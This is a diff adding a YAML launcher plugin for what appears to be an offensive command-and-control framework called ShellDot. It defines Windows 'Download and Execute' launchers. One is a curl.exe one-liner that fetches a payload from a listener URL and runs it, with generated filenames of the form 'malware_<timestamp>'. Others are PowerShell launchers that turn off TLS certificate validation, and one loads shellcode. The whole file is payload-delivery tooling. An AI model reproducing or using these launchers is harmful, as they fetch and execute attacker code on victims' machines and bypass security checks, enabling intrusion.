@@ -1,0 +1,74 @@
+---
+name: Default Example Launchers
+version: 0.5.0
+description: Default Launchers Client Plugin by ShellDot
+type: launcher
+launchers:
+  # This is a simple launcher that utilizes external BATCH file `template.multi.curl-exe.cmd`
+  - name: "Download and Execute [CMD]"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"] # Supported Payload Types. Available: [EXECUTABLE, DEBUG_EXECUTABLE, SHELLCODE, SERVICE, DLL]
+      arch: ["x64", "x86"] # Supported payload architectures. Available: [x64, x86]
+      platform: ["windows"] # Supported platforms. Available: [windows]
+    path: "template.multi.curl-exe.cmd"
+    args:
+      - name: url
+      - name: filename
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "-k" : " ";
+  # Same example but without external file template. The template is defined in this file.
+  # - name: "Download and Execute in [CMD]"
+  #   match:
+  #     type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
+  #     arch: ["x64", "x86"]
+  #     platform: ["windows"]
+  #   template: "curl.exe %%isHTTPS%% %%url%% -o %%filename%% && %%filename%%"
+  #   args:
+  #     - name: url
+  #     - name: isHTTPS
+  #       jsFn: |
+  #         listener.configuration.https ? "-k" : "";
+  #     - name: filename
+  - name: "Download and Execute in [CMD] rand(filename) "
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    template: "curl.exe %%isHTTPS%% %%url%% -o %%filename%% && %%filename%%"
+    args:
+      - name: url
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "-k" : "";
+      - name: filename
+        jsFn: |
+          const timestamp = new Date().getTime();
+          const payloadType = payload.configuration.type;
+          const fileExtension = payloadsStore().extensionMap.get(payloadType);
+          `malware_${timestamp}.${fileExtension}`;
+  - name: "Download and Execute in [PowerShell]"
+    match:
+      type: ["EXECUTABLE", "DEBUG_EXECUTABLE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: file
+    path: "template.multi.powershell.ps1"
+    args:
+      - name: url
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" : "";
+      - name: filename
+  - name: "Download and Execute in PowerShell (SC)"
+    match:
+      type: ["SHELLCODE"]
+      arch: ["x64", "x86"]
+      platform: ["windows"]
+    type: file
+    path: "template.multi.shellcode.powershell.ps1"
+    args:
+      - name: url
+      - name: isHTTPS
+        jsFn: |
+          listener.configuration.https ? "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" : "";
